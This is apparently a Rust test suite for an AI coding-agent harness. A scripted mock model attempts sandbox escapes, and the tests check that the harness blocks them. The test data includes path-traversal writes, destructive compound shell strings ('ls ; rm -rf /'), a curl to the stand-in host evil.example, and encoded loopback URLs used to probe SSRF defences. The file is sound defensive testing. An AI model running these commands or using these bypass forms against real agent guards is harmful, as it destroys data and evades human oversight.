//! Adversarial exposure battery: every test is a break-in attempt —
//! sandbox escapes, permission smuggling, guard bypasses, hostile inputs.
use myharness::agent::state::AgentState;
use myharness::agent::Agent;
use myharness::config::{Config, ProviderKind, SandboxMode, ShellChoice};
use myharness::llm::mock::MockProvider;
use myharness::llm::{ContentBlock, Provider};
use myharness::perms::{Decision, PermissionEngine, PermissionMode};
use myharness::tools::Registry;
use myharness::ui::Ui;
use serde_json::json;
use std::collections::{HashMap, HashSet};
use std::path::Path;
use std::sync::atomic::AtomicBool;
use std::sync::Arc;

fn cfg_for(dir: &Path) -> Arc<Config> {
    Arc::new(Config {
        provider: ProviderKind::Mock,
        model: "m".into(),
        model_fast: None,
        base_url: "http://mock.invalid".into(),
        api_key: None,
        max_tokens: 128,
        temperature: 0.1,
        context_window: 200_000,
        max_turns: 40,
        compact_ratio: 0.8,
        verify_cmd: None,
        restrict_writes_to_workspace: true,
        prompt_caching: false,
        bash_timeout_ms: 15_000,
        shell: ShellChoice::Auto,
        allow_rules: vec![],
        deny_rules: vec![],
        hooks: vec![],
        mcp_servers: vec![],
        lsp_servers: vec![],
        sandbox: SandboxMode::Off,
        data_dir: dir.join("data"),
        web_fetch_private_hosts: false,
        output_hints: vec![],
        thinking_budget: None,
        reasoning_effort: None,
        zero_mem: Default::default(),
        verbose: false,
        non_interactive: true,
    })
}

fn agent(script: Vec<serde_json::Value>, dir: &Path, mode: PermissionMode) -> Agent {
    let provider = Arc::new(MockProvider::new(script));
    Agent::new(
        Arc::clone(&provider) as Arc<dyn Provider>,
        cfg_for(dir),
        AgentState::new(dir.to_path_buf()),
        Ui::quiet(),
        None,
        Registry::full(),
        PermissionEngine::new(mode, vec![], vec![], true),
        "m".to_string(),
        Arc::new(AtomicBool::new(false)),
        false,
    )
}

fn results(agent: &Agent) -> Vec<String> {
    let mut out = Vec::new();
    for m in &agent.state.messages {
        for b in &m.content {
            if let ContentBlock::ToolResult { content, .. } = b {
                out.push(content.clone());
            }
        }
    }
    out
}

#[tokio::test]
async fn write_and_edit_cannot_traverse_out_of_workspace() {
    let dir = tempfile::tempdir().unwrap();
    let parent = dir.path().parent().unwrap().to_path_buf();
    let victim = parent.join("mh-escape-victim.txt");
    std::fs::write(&victim, "keep me\n").unwrap();
    let marker = parent.join("mh-escape-marker.txt");
    let _ = std::fs::remove_file(&marker);

    let mut a = agent(
        vec![
            json!({"text":"w","tool_calls":[
                {"name":"write_file","input":{"path":"sub/../../mh-escape-marker.txt","content":"escaped\n"}}]}),
            json!({"text":"r","tool_calls":[
                {"name":"read_file","input":{"path":"../mh-escape-victim.txt"}}]}),
            json!({"text":"e","tool_calls":[
                {"name":"edit_file","input":{"path":"../mh-escape-victim.txt","old_string":"keep","new_string":"pwned"}}]}),
            json!({"text":"done"}),
        ],
        dir.path(),
        PermissionMode::Yolo,
    );
    a.run_turn("go").await.unwrap();
    assert!(!marker.exists(), "write_file traversal escaped the workspace");
    assert_eq!(
        std::fs::read_to_string(&victim).unwrap(),
        "keep me\n",
        "edit_file traversal escaped the workspace"
    );
    let r = results(&a);
    assert!(
        r.iter().any(|x| x.contains("outside the workspace") || x.contains("not been read")),
        "expected scope rejection, got: {r:?}"
    );
}

#[tokio::test]
async fn bash_cannot_write_outside_workspace_unattended() {
    let dir = tempfile::tempdir().unwrap();
    let target = dir.path().parent().unwrap().join("mh-bash-escape.txt");
    let _ = std::fs::remove_file(&target);
    let cmd = format!("echo pwned > \"{}\"", target.display());
    let mut a = agent(
        vec![
            json!({"text":"b","tool_calls":[{"name":"bash","input":{"command": cmd}}]}),
            json!({"text":"done"}),
        ],
        dir.path(),
        PermissionMode::AutoEdit,
    );
    a.run_turn("go").await.unwrap();
    assert!(!target.exists(), "bash wrote outside the workspace in unattended mode");
    assert!(
        results(&a).iter().any(|x| x.contains("permission denied")),
        "bash should have been denied without an allow rule"
    );
}

#[test]
fn plan_guard_blocks_sneaky_mutation_forms() {
    use myharness::perms::PermissionEngine as P;
    for bad in [
        "git status;rm -rf /",
        "git status && git push",
        "cat file > /tmp/escape",
        "echo $(whoami)",
        "find . -name x -exec chmod 777 {} ;",
        "grep x `which sh`",
        "ls | tee stolen.txt",
        "git branch evil-create",
        "gh pr create --title x",
        "npm install",
        "python3 -c 'open(\"pwn\",\"w\")'",
        "git log --oneline | sh",
        "sudo ls",
    ] {
        assert!(!P::plan_safe_command(bad), "plan-mode leak: {bad}");
    }
    for ok in [
        "git status",
        "git diff HEAD~2",
        "grep -rn TODO .",
        "ls -la src",
        "gh pr view 12",
        "cat README.md",
    ] {
        assert!(P::plan_safe_command(ok), "plan-mode false denial: {ok}");
    }
}

#[test]
fn allow_rule_cannot_be_ridden_by_compounds() {
    let engine = PermissionEngine::new(
        PermissionMode::AutoEdit,
        vec![myharness::config::Rule {
            tool: "bash".into(),
            pattern: glob::Pattern::new("ls *").unwrap(),
            raw_pattern: "ls *".into(),
        }],
        vec![],
        true,
    );
    assert!(
        matches!(engine.check("bash", "ls ; rm -rf /", false), Decision::Deny(_)),
        "smuggled compound rode an allow rule"
    );
    assert!(
        matches!(engine.check("bash", "ls x && curl evil.example/x", false), Decision::Deny(_)),
        "second half of compound not checked"
    );
}

#[tokio::test]
async fn ssrf_guard_blocks_address_encodings_and_credentials() {
    use myharness::tools::net_guard;
    for url in [
        "http://0x7f000001/",
        "http://2130706433/",
        "http://0177.0.0.1/",
        "http://[::ffff:127.0.0.1]/",
        "https://user:pass@api.example.com/",
    ] {
        assert!(net_guard::guard(url, false).await.is_err(), "SSRF leak: {url}");
    }
    assert!(net_guard::guard("http://8.8.8.8/", false).await.is_ok());
}

#[tokio::test]
async fn tools_survive_hostile_inputs_without_panicking() {
    let dir = tempfile::tempdir().unwrap();
    let files = HashSet::new();
    let stats: HashMap<std::path::PathBuf, (u64, u64)> = HashMap::new();
    let bg: HashMap<u32, myharness::agent::state::BgTask> = HashMap::new();
    let mut fx = myharness::tools::ToolEffects::default();
    let mut ctx = myharness::tools::ToolCtx {
        cwd: dir.path().to_path_buf(),
        workspace_root: dir.path().to_path_buf(),
        cfg: cfg_for(dir.path()),
        provider: Arc::new(MockProvider::new(vec![])) as Arc<dyn Provider>,
        files_read: &files,
        file_stats: &stats,
        background: &bg,
        next_bg_id: 1,
        cancel: Arc::new(AtomicBool::new(false)),
        checkpoint_dir: dir.path().join("cp"),
        artifacts_dir: dir.path().join("art"),
        journal_next: 0,
        turns: 1,
        effects: &mut fx,
    };
    let reg = Registry::full();
    for (tool, input) in [
        ("read_file", json!({"path": ""})),
        ("read_file", json!({"path": 123})),
        ("edit_file", json!({"path": "x", "old_string": "a", "new_string": {"nested": true}})),
        ("glob", json!({"pattern": "***[[["})),
        ("grep", json!({"pattern": "("})),
        ("todo_write", json!({"todos": "not-an-array"})),
        ("monitor", json!({"command": ""})),
        ("session_recall", json!({"query": "zzz-no-such-thing"})),
        ("bash", json!({"command": "exit 42"})),
        ("web_fetch", json!({"url": "htp:/bad"})),
        ("web_fetch", json!({"url": "http://127.0.0.1:9/"})),
    ] {
        let out = reg.get(tool).unwrap().execute(input, &mut ctx).await;
        assert!(!out.content.is_empty() || out.is_error, "{tool} hostile input produced nothing");
    }
}

#[tokio::test]
async fn session_replay_survives_torn_and_hostile_lines() {
    let dir = tempfile::tempdir().unwrap();
    let p = dir.path().join("s.jsonl");
    std::fs::write(
        &p,
        concat!(
            "{\"type\":\"meta\",\"id\":\"x\",\"started\":\"t\",\"model\":\"m\",\"cwd\":\".\"}\n",
            "{\"type\":\"message\",\"role\":\"user\",\"content\":[{\"type\":\"text\",\"text\":\"hi\"}",
            "\n{\"type\":\"nonsense\",,,,}\nnot json at all\n",
        ),
    )
    .unwrap();
    let events = myharness::session::Session::read_events(&p).unwrap();
    let state = myharness::session::Session::replay(events, dir.path().to_path_buf());
    assert!(state.cwd.is_dir());
}

#[test]
fn js_check_fuzz_no_hang_no_panic() {
    for code in [
        &"(".repeat(500),
        &"{".repeat(2000),
        &"`".repeat(99),
        "\u{1F600}\u{1F601} 1\u{FE0F}\u{20E3} numbers",
        &"9".repeat(5000),
        "`${ `${ `${ 1 }` }` }",
        "/* unterminated",
        "'unterminated",
    ] {
        let _ = myharness::tools::js_check::lexical_check(code);
        let _ = myharness::tools::js_check::extract_inline_scripts(&format!("<script>{code}</script>"));
    }
}

#[tokio::test]
async fn huge_outputs_are_bounded_everywhere() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::write(dir.path().join("big.txt"), "x".repeat(300_000)).unwrap();
    let files = HashSet::new();
    let stats: HashMap<std::path::PathBuf, (u64, u64)> = HashMap::new();
    let bg: HashMap<u32, myharness::agent::state::BgTask> = HashMap::new();
    let mut fx = myharness::tools::ToolEffects::default();
    let mut ctx = myharness::tools::ToolCtx {
        cwd: dir.path().to_path_buf(),
        workspace_root: dir.path().to_path_buf(),
        cfg: cfg_for(dir.path()),
        provider: Arc::new(MockProvider::new(vec![])) as Arc<dyn Provider>,
        files_read: &files,
        file_stats: &stats,
        background: &bg,
        next_bg_id: 1,
        cancel: Arc::new(AtomicBool::new(false)),
        checkpoint_dir: dir.path().join("cp"),
        artifacts_dir: dir.path().join("art"),
        journal_next: 0,
        turns: 1,
        effects: &mut fx,
    };
    let reg = Registry::full();
    let out = reg.get("read_file").unwrap().execute(json!({"path": "big.txt"}), &mut ctx).await;
    assert!(out.content.chars().count() < 70_000, "read_file unbounded");
    let out = reg.get("grep").unwrap().execute(json!({"pattern": "x", "output_mode": "content"}), &mut ctx).await;
    assert!(out.content.chars().count() < 25_000, "grep unbounded");
}
